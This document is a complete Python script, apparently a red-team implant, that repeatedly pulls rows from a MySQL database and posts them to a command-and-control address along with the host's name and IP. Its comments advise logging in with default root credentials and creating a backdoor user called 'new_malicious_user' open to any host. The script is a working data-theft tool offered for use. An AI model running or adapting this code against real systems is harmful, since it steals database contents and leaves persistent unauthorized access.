import requests
import time
import socket
import mysql.connector  # Use for MySQL database exfiltration

# Configuration
C2_URL = 'x.x.x.x/network'#Change to the redteams ops_station you want to beacon back to.
INTERVAL = 60  # Beacon interval in seconds

# MySQL Database Exfiltration Configuration
DB_HOST = '127.0.0.1'  # The database must be running on the server being deployed to
DB_USER = 'your_mysql_user'  # Replace with a valid mysql user ----------------------------------
# login to mysql with: 
#       "sudo mysql -u root -p" | "root":"" is the default cred for mysql.
# Create a new user just in case ;) :
#       "CREATE USER 'new_malicious_user'@'%' IDENTIFIED BY 'new_malicious_password'";
#------------------------------------------------------------------------------------------------
DB_PASSWORD = 'your_mysql_password'  # Replace with your MySQL password
DB_NAME = 'your_database_name'  # Replace with the name of the database you want to pull data from. **show all databases with "SHOW DATABASES;"
DB_QUERY = 'SELECT * FROM some_database'  # Replace with the query to exfiltrate data. **You can also choose to exfil a single table/column.

def get_system_info():
    return {
        'hostname': socket.gethostname(),
        'ip': socket.gethostbyname(socket.gethostname())
    }

def fetch_mysql_data(host, user, password, database, query):
    conn = mysql.connector.connect(
        host=host,
        user=user,
        password=password,
        database=database
    )
    cursor = conn.cursor()
    cursor.execute(query)
    rows = cursor.fetchall()
    conn.close()
    return rows

def beacon():
    system_info = get_system_info()
    
    # Exfiltrate data from a MySQL database
    db_data = fetch_mysql_data(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME, DB_QUERY)
    for row in db_data:
        payload = {
            'system_info': system_info,
            'data_row': str(row)  # Convert the row to a string for transmission
        }
        send_payload(payload)

def send_payload(payload):
    try:
        response = requests.post(C2_URL, json=payload)
        if response.status_code == 200:
            print("Data sent successfully.")
        else:
            print(f"Failed to send data. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending data: {e}")

if __name__ == "__main__":
    while True:
        beacon()
        time.sleep(INTERVAL)  # Wait for the specified interval before running the beacon again
